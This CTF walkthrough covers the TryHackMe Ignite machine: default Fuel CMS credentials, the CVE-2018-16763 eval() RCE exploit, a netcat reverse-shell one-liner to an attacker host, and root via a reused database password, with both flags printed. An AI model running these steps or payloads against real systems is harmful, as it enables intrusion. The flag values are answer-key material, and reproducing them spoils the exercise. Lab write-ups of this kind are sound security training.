---
title: "Ignite"
description: "A boot2root CTF machine exploiting Fuel CMS 1.4.1 remote code execution (CVE-2018-16763) and privilege escalation using hardcoded database credentials."
difficulty: "Easy"
tags: ["Fuel CMS", "CVE-2018-16763", "RCE", "CMS Exploitation", "Linux Privilege Escalation"]
date: "2026-07-04"
---

## Overview

![Ignite room cover](/assets/screenshots/ignite/cover.png)

Ignite is a TryHackMe boot2root machine built around a vulnerable Fuel CMS installation. Fuel CMS version 1.4.1 contains an unauthenticated remote code execution vulnerability (CVE-2018-16763) that allows arbitrary PHP code injection through the `filter` parameter. After gaining initial access as `www-data`, the database configuration file reveals hardcoded root credentials that provide direct privilege escalation.

## Room Information

- **Platform:** TryHackMe
- **Difficulty:** Easy
- **Skills Learned:** CMS enumeration, RCE exploitation, credential reuse, Linux privilege escalation

## Enumeration

### Nmap Scan

Started with a port scan:

```bash
nmap -sV -sC -oN nmap.txt <target-ip>
```

Only a single port was exposed:

| Port | Service | Version |
|------|---------|---------|
| 80/tcp | HTTP | Apache httpd 2.4.18 (Ubuntu) |

![Nmap scan results](/assets/screenshots/ignite/nmap.png)

### Web Enumeration

The web server was running **Fuel CMS** version 1.4. The homepage was a "Getting Started" page for the CMS that revealed both the version number and default admin credentials at the bottom.

The `robots.txt` file contained a disallowed entry pointing to the admin panel:

```
User-agent: *
Disallow: /fuel/
```

Navigating to `/fuel/` presented the Fuel CMS login page.

![Fuel CMS login page](/assets/screenshots/ignite/fuel_admin_login.png)

### Admin Panel Access

The Fuel CMS installation guide displayed on the homepage listed the default credentials:

- **Username:** `admin`
- **Password:** `admin`

These worked, granting full access to the CMS admin dashboard:

![Fuel CMS admin dashboard](/assets/screenshots/ignite/admin_dashboard.png)

The dashboard contained sections for pages, blocks, assets, users, and settings, but no immediately useful exploitation functions were accessible from within the admin panel itself.

## Exploitation — Fuel CMS RCE

### CVE-2018-16763

Fuel CMS 1.4.1 is vulnerable to a pre-authentication remote code execution vulnerability. The flaw exists in the `filter` parameter of the `/fuel/pages/select/` endpoint, which fails to sanitize user input before passing it to PHP's `eval()` function. This allows an attacker to inject arbitrary PHP code without authentication.

A public exploit is available on Exploit-DB (ID 50477):

```bash
searchsploit fuel cms
```

![Searchsploit finding Fuel CMS exploits](/assets/screenshots/ignite/searchsploit.png)

```bash
python3 50477.py -u http://<target-ip>/
```

The exploit provided an interactive command shell:

![RCE exploit running](/assets/screenshots/ignite/exploit_rce.png)

```bash
Enter Command $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse Shell

The exploit shell was limited — it used PHP's `system()` function and could hang on certain commands. Established a more stable reverse shell:

Started a listener:

```bash
nc -lvnp 9001
```

Then executed a reverse shell payload through the exploit:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker-ip> 9001 >/tmp/f
```

![Reverse shell established](/assets/screenshots/ignite/rev_shell.png)

### User Flag

The user flag was located in the `www-data` user's home directory:

```bash
www-data@ubuntu:/home/www-data$ cat flag.txt
6470e394cbf6dab6a91682cc8585059b
```

![User flag](/assets/screenshots/ignite/user_flag.png)

## Privilege Escalation

### Database Configuration Discovery

The Fuel CMS homepage mentioned that database credentials could be found in the configuration directory. Navigated to the Fuel CMS application config:

```bash
cd /var/www/html/fuel/application/config
cat database.php
```

![Database configuration file with credentials](/assets/screenshots/ignite/database_php.png)

The file contained hardcoded MySQL credentials — and the password was reused for the root system account:

```php
'hostname' => 'localhost',
'username' => 'root',
'password' => 'mememe',
'database' => 'fuel_schema',
```

### Switching to Root

With the root password in hand, switched users:

```bash
www-data@ubuntu:/$ su root
Password: mememe

root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
```

![Switching to root user](/assets/screenshots/ignite/su_root.png)

### Root Flag

```bash
root@ubuntu:~# cat /root/root.txt
b9bbcb33e11b80be759c4e844862482d
```

![Root flag](/assets/screenshots/ignite/root_flag.png)

## Flags

| Flag | Location | Value |
|------|----------|-------|
| User | `/home/www-data/flag.txt` | `6470e394cbf6dab6a91682cc8585059b` |
| Root | `/root/root.txt` | `b9bbcb33e11b80be759c4e844862482d` |

## Commands Used

```bash
nmap -sV -sC -oN nmap.txt <target-ip>
searchsploit fuel cms
python3 50477.py -u http://<target-ip>/
# Within exploit shell:
id
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker-ip> 9001 >/tmp/f
# In reverse shell:
cat /home/www-data/flag.txt
cat /var/www/html/fuel/application/config/database.php
su root
cat /root/root.txt
```

## Lessons Learned

- **Default credentials are still the most common entry point.** Fuel CMS ships with `admin:admin` and the credentials were printed directly on the landing page. This single misconfiguration is what enabled the entire attack chain.
- **CVE-2018-16763 demonstrates the danger of `eval()`.** The vulnerability exists because user input is passed directly to PHP's `eval()` function without sanitization. Dynamic code evaluation should be avoided entirely, or at minimum restricted with strict input validation.
- **Database passwords are often reused as system passwords.** The root MySQL password `mememe` was reused as the Linux root password. Password reuse across services dramatically amplifies the impact of a single credential leak.
- **Configuration files are treasure maps.** CMS configuration files frequently contain sensitive credentials. The `database.php` file in Fuel CMS was the linchpin of this entire privilege escalation.
- **robots.txt can be an attacker's roadmap.** Disallowing `/fuel/` in `robots.txt` only draws attention to it. Sensitive admin panels should be protected with authentication, IP allowlisting, or alternative access methods — not a text file.

## References

- [TryHackMe — Ignite](https://tryhackme.com/room/ignite)
- [CVE-2018-16763 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2018-16763)
- [Fuel CMS RCE Exploit (EDB 50477)](https://www.exploit-db.com/exploits/50477)
- [Fuel CMS — GitHub](https://github.com/daylightstudio/FUEL-CMS)
